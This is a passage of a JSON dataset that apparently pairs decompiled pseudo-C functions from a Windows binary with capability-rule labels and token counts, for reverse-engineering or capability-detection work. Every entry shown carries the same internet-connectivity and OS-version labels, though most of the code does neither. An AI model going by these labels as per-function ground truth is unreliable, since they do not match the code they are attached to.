+ 5);\n        iVar1 = fcn.00053570(*(arg_ch + 0x14), *(arg_ch + 0x18), 2, *arg_18h, arg_18h, 0);\n        if (iVar1 != 0) {\n            *(arg_8h + 0x18) = iVar1;\n            return 0;\n        }\n        *arg_10h = 0xb1c20dc0;\n        arg_10h[1] = *(arg_ch + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 1329
    },
    "00053dc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00053dc0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_11h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = arg_10h;\n    if (*(arg_ch + 0x18) != 0) {\n        var_ch = fcn.000537f0(arg_10h, &var_4h);\n        goto code_r0x00053f55;\n    }\n    var_10h = *(arg_ch + 0xc);\n    if (*(var_10h + 5) != '\\x10') goto code_r0x00053f55;\n    var_28h = 0xb1be2620;\n    var_2ch = var_10h + 8;\n    for (var_24h = 0x10; 3 < var_24h; var_24h = var_24h - 4) {\n        if (*var_2ch != *var_28h) goto code_r0x00053e44;\n        var_28h = var_28h + 1;\n        var_2ch = var_2ch + 1;\n    }\n    if (var_24h == 0) {\ncode_r0x00053ec6:\n        var_34h = 0;\n    }\n    else {\ncode_r0x00053e44:\n        var_30h = *var_2ch - *var_28h;\n        if (var_30h == 0) {\n            if (var_24h == 1) goto code_r0x00053ec6;\n            var_30h = *(var_2ch + 1) - *(var_28h + 1);\n            if (var_30h == 0) {\n                if (var_24h == 2) goto code_r0x00053ec6;\n                var_30h = *(var_2ch + 2) - *(var_28h + 2);\n                if (var_30h == 0) {\n                    if ((var_24h == 3) || (var_30h = *(var_2ch + 3) - *(var_28h + 3),  var_30h == 0))\n                    goto code_r0x00053ec6;\n                }\n            }\n        }\n        var_34h = 1;\n        if (var_30h < 1) {\n            var_34h = -1;\n        }\n    }\n    if (var_34h == 0) {\n        puVar1 = var_10h + *(var_10h + 5) + 0xd;\n        iVar2 = fcn.000538d0(arg_10h, &var_11h);\n        if (iVar2 != 0) {\n            if (*puVar1 < 0x4c) {\n                fcn.0007877e(iVar2 + 0xfb, puVar1, *puVar1);\n            }\n            (**0xb1bde010)();\n        }\n    }\ncode_r0x00053f55:\n    fcn.000164b0(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 814
    },
    "00053fa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00053fa0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_ch = *(arg_ch + 4);\n    var_15h._0_1_ = 1;\n    var_10h = 0;\n    var_4h = 0;\n    var_5h = 0;\n    uVar1 = (**0xb1bde2a4)(var_ch, 0x80000000, 0, 0, &var_10h, 0);\n    if (uVar1 == 0) {\n        var_4h = fcn.000538d0(*(arg_ch + 0x18), &var_5h);\n        if (var_4h == 0) {\n            *(arg_8h + 0x18) = 0xc000000d;\n            var_15h._0_1_ = 0;\n            uVar1 = var_4h;\n        }\n        else {\n            *(var_4h + 0x24) = var_10h;\n            uVar1 = var_10h;\n        }\n    }\n    if (var_4h != 0) {\n        uVar1 = (**0xb1bde010)();\n    }\n    if (var_10h != 0) {\n        uVar1 = (**0xb1bde2e4)();\n    }\n    return uVar1 & 0xffffff00 | var_15h;\n}\n",
        "token_count": 381
    },
    "00054050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00054050(uint noname_0, int32_t arg_ch)\n\n{\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_4h = fcn.000538d0(*(arg_ch + 0x18), &var_5h);\n    if (var_4h != 0) {\n        *(var_4h + 0x24) = 0;\n        var_4h = (**0xb1bde010)();\n    }\n    return var_4h & 0xffffff00 | 1;\n}\n",
        "token_count": 139
    },
    "000540b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.000540b0(uint noname_0, int32_t arg_ch, uint *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_34h;\n    uint *var_30h;\n    char *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint16_t *var_11h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_8h = 0;\n    var_11h._0_1_ = 0;\n    if (*(arg_ch + 0x14) == *0xb1c5b720) {\n        *0x8 = *(*(arg_ch + 8) + 0x14) + 4;\n        var_8h = fcn.000538d0(*(arg_ch + 0x18), &var_11h);\n        if (var_8h != 0) {\n            if ((*(var_8h + 0x154) != '\\0') || (*(var_8h + 0x155) != '\\0')) {\n                *(var_8h + 0x154) = 0;\n                *(var_8h + 0x155) = 0;\n                *(var_8h + 0x158) = 0;\n            }\n            if (((*(var_8h + 0x24) != 0) && (iVar2 = fcn.000538d0(*(var_8h + 0x24), 0),  iVar2 != 0)) &&\n               (*stack0xffffffec < 0x4c)) {\n                fcn.0007877e(var_8h + 0xb0, stack0xffffffec, *stack0xffffffec);\n                var_ch = stack0xffffffec + 2;\n                cVar1 = fcn.00056ee0(1);\n                if ((cVar1 != '\\0') && (var_4h = fcn.00035230(0x2d),  var_4h != NULL)) {\n                    *var_4h = *(iVar2 + 0xff);\n                    var_4h[1] = *(iVar2 + 0x103);\n                    var_4h[2] = *(iVar2 + 0x107);\n                    *(var_4h + 3) = *(iVar2 + 0x10b);\n                    *(var_4h + 0xe) = *var_ch;\n                    *(var_4h + 0x12) = var_ch[1];\n                    *(var_4h + 0x16) = var_ch[2];\n                    *(var_4h + 0x1a) = *(var_ch + 3);\n                    var_2ch = var_8h + 8;\n                    var_30h = var_4h + 7;\n                    do {\n                        cVar1 = *var_2ch;\n                        *var_30h = cVar1;\n                        var_2ch = var_2ch + 1;\n                        var_30h = var_30h + 1;\n                    } while (cVar1 != '\\0');\n                    *arg_10h = 0xb1c212a0;\n                    arg_10h[1] = var_4h;\n                }\n            }\n        }\n    }\n    if (var_8h != 0) {\n        (**0xb1bde010)();\n    }\n    return 1;\n}\n",
        "token_count": 804
    },
    "000542a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000542a0(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_d4h;\n    uint var_cch;\n    uint *var_c8h;\n    uint var_c4h;\n    uint var_bch;\n    uint *var_b8h;\n    uint *var_b0h;\n    uint *var_a8h;\n    uint *var_a0h;\n    uint *var_98h;\n    uint *var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uchar uStack41;\n    uint var_24h;\n    uchar auStack34 [26];\n    int32_t var_4h;\n    \n    var_4h = arg_10h;\n    var_24h = *0xb1be2138;\n    iVar2 = *(arg_ch + 0x18);\n    if (iVar2 < -0x3ffffdc9) {\n        if (iVar2 != -0x3ffffdca) {\n            if (iVar2 == -0x3fffff4b) {\n                puVar3 = &uStack41;\n                do {\n                    var_a0h = puVar3;\n                    puVar3 = var_a0h + 1;\n                } while (*(var_a0h + 1) != '\\0');\n                *(var_a0h + 1) = *0xb1be2658;\n                *(var_a0h + 5) = *0xb1be265c;\n                *(var_a0h + 9) = *0xb1be2660;\n                goto code_r0x0005454e;\n            }\n            if (iVar2 == -0x3ffffee0) goto code_r0x000543b6;\n            if (iVar2 != -0x3ffffdf3) goto code_r0x000544e7;\n        }\n        puVar3 = &uStack41;\n        do {\n            var_90h = puVar3;\n            puVar3 = var_90h + 1;\n        } while (*(var_90h + 1) != '\\0');\n        *(var_90h + 1) = *0xb1be2648;\n        *(var_90h + 5) = *0xb1be264c;\n        *(var_90h + 7) = *0xb1be264e;\n    }\n    else {\n        if (iVar2 < -0x3ffffdbe) {\n            if (iVar2 == -0x3ffffdbf) {\ncode_r0x000543b6:\n                puVar3 = &uStack41;\n                do {\n                    var_98h = puVar3;\n                    puVar3 = var_98h + 1;\n                } while (*(var_98h + 1) != '\\0');\n                *(var_98h + 1) = *0xb1be2650;\n                *(var_98h + 5) = *0xb1be2654;\n                goto code_r0x0005454e;\n            }\n            if ((-0x3ffffdc5 < iVar2) && (iVar2 < -0x3ffffdc0)) {\n                puVar3 = &uStack41;\n                do {\n                    var_a8h = puVar3;\n                    puVar3 = var_a8h + 1;\n                } while (*(var_a8h + 1) != '\\0');\n                *(var_a8h + 1) = *0xb1be2664;\n                *(var_a8h + 5) = *0xb1be2668;\n                *(var_a8h + 9) = *0xb1be266c;\n                goto code_r0x0005454e;\n            }\n        }\n        else if (iVar2 == 0) {\n            puVar3 = &uStack41;\n            do {\n                var_b0h = puVar3;\n                puVar3 = var_b0h + 1;\n            } while (*(var_b0h + 1) != '\\0');\n            *(var_b0h + 1) = *0xb1be2670;\n            *(var_b0h + 5) = *0xb1be2674;\n            *(var_b0h + 9) = *0xb1be2678;\n            goto code_r0x0005454e;\n        }\ncode_r0x000544e7:\n        puVar3 = &var_24h;\n        do {\n            var_b8h = puVar3;\n            puVar3 = var_b8h + 1;\n        } while (*var_b8h != '\\0');\n        fcn.0007865e(var_b8h, 0xb1be267c, *(arg_ch + 0x18));\n    }\ncode_r0x0005454e:\n    fcn.00054600(&var_88h, &var_24h, var_4h, var_4h + 0xe, var_4h + 0x1c);\n    var_c8h = &var_88h;\n    do {\n        cVar1 = *var_c8h;\n        var_c8h = var_c8h + 1;\n    } while (cVar1 != '\\0');\n    fcn.00056eb0(1, &var_88h, var_c8h - (&var_88h + 1));\n    fcn.00035330(arg_10h);\n    fcn.000164b0(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 1232
    },
    "000546e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.000546e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_6h;\n    \n    var_6h._0_1_ = 1;\n    *NULL = fcn.000538d0(*(arg_ch + 0x18), &var_6h + 1);\n    if (*NULL != 0) {\n        if (*(*NULL + 0x154) != '\\0') {\n            *(*(arg_8h + 0x60) + 3) = *(*(arg_8h + 0x60) + 3) | 1;\n            fcn.00045a10(*NULL + 0x15c, arg_8h + 0x58);\n            *(arg_8h + 0x18) = 0x103;\n            var_6h._0_1_ = 0;\n        }\n        *NULL = (**0xb1bde010)();\n    }\n    return *NULL & 0xffffff00 | var_6h;\n}\n",
        "token_count": 245
    },
    "00054770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00054770(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    piVar2 = arg_ch + 4;\n    iVar3 = fcn.000538d0(*(arg_ch + 0x18), &var_1h);\n    if (((iVar3 != 0) && (-1 < *piVar2)) && (*piVar2 < 0xb)) {\n        iVar1 = iVar3 + (*piVar2 * 3 + 0xb) * 4;\n        if (*(arg_ch + 8) == 0) {\n            *(iVar1 + 4) = 0;\n            *(iVar1 + 8) = 0;\n        }\n        else {\n            for (var_14h = 0; (*(var_14h * 8 + -0x4e3a8338) != -1 && (*(var_14h * 8 + -0x4e3a8338) != *piVar2));\n                var_14h = var_14h + 1) {\n            }\n            if (*(var_14h * 8 + -0x4e3a8338) != -1) {\n                *(iVar1 + 4) = *(arg_ch + 8);\n                *(iVar1 + 8) = *(arg_ch + 0xc);\n                if (*(var_14h * 8 + -0x4e3a8334) == 0) {\n                    *(arg_ch + 8) = 0;\n                    *(arg_ch + 0xc) = 0;\n                }\n                else {\n                    *(arg_ch + 8) = *(var_14h * 8 + -0x4e3a8334);\n                    *(arg_ch + 0xc) = iVar1;\n                }\n            }\n        }\n    }\n    if (iVar3 != 0) {\n        (**0xb1bde010)();\n    }\n    return 1;\n}\n",
        "token_count": 497
    },
    "000548b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.000548b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_78h;\n    uint var_71h;\n    uint32_t var_5h;\n    \n    var_71h._0_1_ = 1;\n    uVar1 = fcn.000538d0(*(arg_ch + 0x18), &var_5h);\n    if (uVar1 != 0) {\n        if (*(uVar1 + 0x154) != '\\0') {\n            *(arg_8h + 0x18) = 0;\n            *(arg_8h + 0x1c) = *(arg_ch + 4);\n            var_71h._0_1_ = 0;\n        }\n        unique0x10000097 = uVar1;\n        (**0xb1bde010)();\n        uVar1 = (**0xb1bde004)();\n        if ((uVar1 & 0xff) == 0) {\n            fcn.00036880(&var_71h + 1, 100);\n            uVar1 = fcn.00037b20(&var_71h + 1);\n            if (uVar1 != 0) {\n                uVar1 = fcn.00037a60();\n            }\n        }\n    }\n    return uVar1 & 0xffffff00 | var_71h;\n}\n",
        "token_count": 329
    },
    "00054950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00054950(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint32_t var_6h;\n    \n    var_6h._0_1_ = 1;\n    if (*(arg_ch + 4) == 0) {\n        uVar1 = CONCAT31(arg_ch + 4 >> 8, 1);\n    }\n    else {\n        *NULL = fcn.000538d0(*(arg_ch + 0x18), &var_6h + 1);\n        if (*NULL != 0) {\n            if (*(*NULL + 0x154) == '\\0') {\n                if ((*(arg_ch + 8) & 0x80) == 0) {\n                    *arg_10h = 0xb1c219e0;\n                }\n            }\n            else {\n                *(arg_8h + 0x18) = 0;\n                *(arg_8h + 0x1c) = 0;\n                var_6h._0_1_ = 0;\n            }\n            *NULL = (**0xb1bde010)();\n        }\n        uVar1 = *NULL & 0xffffff00 | var_6h;\n    }\n    return uVar1;\n}\n",
        "token_count": 307
    },
    "000549e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.000549e0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000538d0(*(*(arg_ch + 0x60) + 0x18), &var_9h);\n    if (var_4h != 0) {\n        if ((*(var_4h + 0x155) == '\\0') && (*(arg_ch + 0x18) == 0)) {\n            *0x8 = var_4h + 0xb0;\n            if ((*(*(arg_ch + 4) + 6) & 5) == 0) {\n                var_1ch = (**0xb1bde0e0)(*(arg_ch + 4), 0, 1, 0, 0, 0x10);\n            }\n            else {\n                var_1ch = *(*(arg_ch + 4) + 0xc);\n            }\n            cVar1 = fcn.00055a00(var_4h, *(stack0xfffffff4 + 6), *(arg_ch + 0x1c) & 0xffff0000 | *(stack0xfffffff4 + 4)\n                                 , var_1ch, *(arg_ch + 0x1c));\n            if (cVar1 != '\\0') {\n                *(arg_ch + 0x18) = 0;\n                *(arg_ch + 0x1c) = 0;\n            }\n        }\n        (**0xb1bde010)();\n    }\n    fcn.000164b0(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 462
    },
    "00054ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00054b58)\n\nbool fcn.00054ae0(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint32_t extraout_ECX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch;\n    uint *var_10h;\n    uint var_18h;\n    uint *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_25h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0xb1c45870;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    var_34h = NULL;\n    bVar2 = false;\n    stack0xffffffd8 = 0;\n    var_30h = 0;\n    *var_10h = 0;\n    var_10h[1] = 0;\n    var_4h = 0;\n    piVar1 = *(var_ch + 0x10);\n    if (piVar1 != NULL) {\n        *NULL = (**0xb1bde294)(piVar1, 0x24, 0, 0, 0);\n        if (*NULL == 0) {\n            var_30h = -0x3fffffe9;\n        }\n        else {\n            (**0xb1bde2a0)(*NULL, extraout_ECX & 0xffffff00 | *(var_8h + 0x20), 0);\n            bVar2 = true;\n            if ((piVar1[3] == 0x100) &&\n               (((piVar1[2] == 0x100 && (piVar1[4] == 1)) ||\n                ((piVar1[2] == 0x200 && (((*piVar1 == 0x301 || (*piVar1 == 0x400)) || (*piVar1 == 0x401)))))))) {\n                for (var_20h = 0;\n                    (var_20h < *0xb1c5b728 &&\n                    ((*(var_20h * 0xc + -0x4e3a48d4) != *piVar1 || (*(var_20h * 0xc + -0x4e3a48d0) != piVar1[1]))));\n                    var_20h = var_20h + 1) {\n                }\n                if ((var_20h < *0xb1c5b728) &&\n                   (((*piVar1 == 0x301 && (*(var_20h * 0xc + -0x4e3a48cc) != 0x303)) ||\n                    (((*piVar1 == 0x400 && (*(var_20h * 0xc + -0x4e3a48cc) != 0x404)) ||\n                     ((*piVar1 == 0x401 && (*(var_20h * 0xc + -0x4e3a48cc) != 0x403)))))))) {\n                    var_30h = 0;\n                }\n                else {\n                    var_34h = fcn.00035200(0x24);\n                    if (var_34h == NULL) {\n                        var_30h = -0x3fffff66;\n                    }\n                    else {\n                        var_10h[1] = var_34h;\n                        *var_10h = 0xb1c21da0;\n                        puVar4 = *(var_ch + 0x10);\n                        puVar5 = var_34h;\n                        for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_30h != 0) {\n        fcn.00035330(var_34h);\n    }\n    if (stack0xffffffd8 != 0) {\n        if (bVar2) {\n            (**0xb1bde29c)(stack0xffffffd8);\n        }\n        (**0xb1bde2ac)(stack0xffffffd8);\n    }\n    *(var_8h + 0x18) = var_30h;\n    *in_FS_OFFSET = var_10h_2;\n    return var_30h == 0;\n}\n",
        "token_count": 1101
    },
    "00054da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nvoid fcn.00054da0(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_18h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    int32_t *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_21h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0xb1c45860;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    var_28h = 0;\n    bVar3 = false;\n    if (*(var_ch + 0x18) == 0) {\n        var_4h = 0;\n        piVar1 = *(var_ch + 0x3c);\n        iVar4 = *(var_ch + 0x1c);\n        if (((piVar1 != NULL) && (iVar4 != 0)) && (var_28h = (**0xb1bde294)(piVar1, iVar4, 0, 0, 0),  var_28h != 0)) {\n            (**0xb1bde2a0)(var_28h, extraout_ECX & 0xffffff00 | *(var_ch + 0x20), 1);\n            bVar3 = true;\n            if ((var_10h[2] == 0x100) && (var_10h[4] == 1)) {\n                for (stack0xffffffdc = 0;\n                    (stack0xffffffdc < *0xb1c5b728 &&\n                    ((*(stack0xffffffdc * 0xc + -0x4e3a48d4) != *var_10h ||\n                     (*(stack0xffffffdc * 0xc + -0x4e3a48d0) != var_10h[1])))); *0x8 = stack0xffffffdc + 1) {\n                }\n                if ((stack0xffffffdc == *0xb1c5b728) && (*0xb1c5b728 < 0x1000)) {\n                    *(stack0xffffffdc * 0xc + -0x4e3a48d4) = *var_10h;\n                    *(stack0xffffffdc * 0xc + -0x4e3a48d0) = var_10h[1];\n                    *(stack0xffffffdc * 0xc + -0x4e3a48cc) = *piVar1;\n                    *0xb1c5b728 = *0xb1c5b728 + 1;\n                }\n            }\n            else if (*var_10h == 0x400) {\n                uVar2 = var_10h[4];\n                if (uVar2 < 0x103) {\n                    if (uVar2 == 0x102) {\n                        stack0xffffffdc = 1;\n                        var_3ch = piVar1;\n                        while (var_3ch <= piVar1 + stack0xffffffdc * -0x18 + iVar4) {\n                            iVar5 = fcn.00053970(var_3ch[1], var_3ch[2], var_3ch[3], var_3ch[4]);\n                            if (iVar5 == 0) {\n                                var_3ch = var_3ch + 6;\n                            }\n                            else {\n                                fcn.00078586(var_3ch, var_3ch + 6, (iVar4 - (var_3ch - piVar1)) + -0x18);\n                                *NULL = stack0xffffffdc + 1;\n                            }\n                        }\n                        *(var_ch + 0x1c) = *(var_ch + 0x1c) + (stack0xffffffdc + -1) * -0x18;\n                    }\n                    else if (uVar2 == 1) {\n                        iVar4 = fcn.00053a40();\n                        piVar1[0xe] = piVar1[0xe] - iVar4;\n                    }\n                    else if (uVar2 == 0x101) {\n                        stack0xffffffdc = 1;\n                        var_44h = piVar1;\n                        while (var_44h <= piVar1 + stack0xffffffdc * -0x14 + iVar4) {\n                            iVar5 = fcn.00053970(var_44h[1], var_44h[2], var_44h[3], var_44h[4]);\n                            if (iVar5 == 0) {\n                                var_44h = var_44h + 5;\n                            }\n                            else {\n                                fcn.00078586(var_44h, var_44h + 5, (iVar4 - (var_44h - piVar1)) + -0x14);\n                                *NULL = stack0xffffffdc + 1;\n                            }\n                        }\n                        *(var_ch + 0x1c) = *(var_ch + 0x1c) + (stack0xffffffdc + -1) * -0x14;\n                    }\n                }\n                else if (uVar2 == 0x110) {\n                    stack0xffffffdc = 0;\n                    var_40h = piVar1;\n                    while (var_40h < piVar1 + (iVar4 - stack0xffffffdc)) {\n                        iVar5 = fcn.00053970(var_40h[2], var_40h[3], var_40h[4], var_40h[5]);\n                        if (iVar5 == 0) {\n                            var_40h = var_40h + *var_40h;\n                        }\n                        else {\n                            fcn.00078586(var_40h, var_40h + *var_40h, (iVar4 - (var_40h - piVar1)) - *var_40h);\n                            *0x8 = stack0xffffffdc + *var_40h;\n                        }\n                    }\n                    *(var_ch + 0x1c) = *(var_ch + 0x1c) - stack0xffffffdc;\n                }\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_28h != 0) {\n        if (bVar3) {\n            (**0xb1bde29c)(var_28h);\n        }\n        (**0xb1bde2ac)(var_28h);\n    }\n    fcn.00035330(var_10h);\n    fcn.000164b0(var_8h, var_ch);\n    *in_FS_OFFSET = var_10h_2;\n    return;\n}\n",
        "token_count": 1636
    },
    "00055210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00055210(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t *arg_24h, int32_t *arg_28h)\n\n{\n    char cVar1;\n    uint var_98h;\n    uint var_90h;\n    uint *var_8ch;\n    uint var_88h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    uint16_t *var_dh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = arg_8h;\n    var_20h = 0;\n    var_4h = 0;\n    var_24h = 0;\n    var_20h = fcn.000538d0(*arg_8h, &var_dh);\n    if (var_20h == 0) {\n        var_28h = -0x3fffff66;\n    }\n    else {\n        *0x4 = arg_10h + 4;\n        var_14h = var_20h + 0xfb;\n        var_1ch = arg_10h + 8;\n        var_8h = var_20h + 0xff;\n        cVar1 = fcn.00056ee0(1);\n        if (cVar1 != '\\0') {\n            fcn.00054600(&var_88h, 0xb1be213c, var_1ch, var_8h, var_20h + 8);\n            var_8ch = &var_88h;\n            do {\n                cVar1 = *var_8ch;\n                var_8ch = var_8ch + 1;\n            } while (cVar1 != '\\0');\n            fcn.00056eb0(1, &var_88h, var_8ch - (&var_88h + 1));\n        }\n        (**0xb1bde010)();\n        var_20h = 0;\n        var_28h = (*var_18h[1])(var_18h[2], arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n        if ((var_28h == -0x3fffffea) && (*arg_28h != 0)) {\n            var_24h = *(*arg_28h + 0x60);\n            var_28h = -0x3ffffec0;\n            var_4h = fcn.000538d0(*(var_24h + 0x18), &var_dh);\n            if (var_4h != 0) {\n                *(var_4h + 0x154) = 0;\n                *(var_4h + 0x155) = 0;\n                *(var_4h + 0x158) = 0;\n                if (((*(var_4h + 0x24) == *var_18h) && (*(var_4h + 0x150) == *arg_24h)) &&\n                   (*arg_24h = var_4h + 0x148,  *stack0xfffffff0 < 0x4c)) {\n                    fcn.0007877e(var_4h + 0xb0, stack0xfffffff0, *stack0xfffffff0);\n                    var_28h = -0x3fffffea;\n                }\n            }\n        }\n    }\n    if ((var_20h != 0) || (var_4h != 0)) {\n        (**0xb1bde010)();\n    }\n    return var_28h;\n}\n",
        "token_count": 885
    },
    "00055440": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
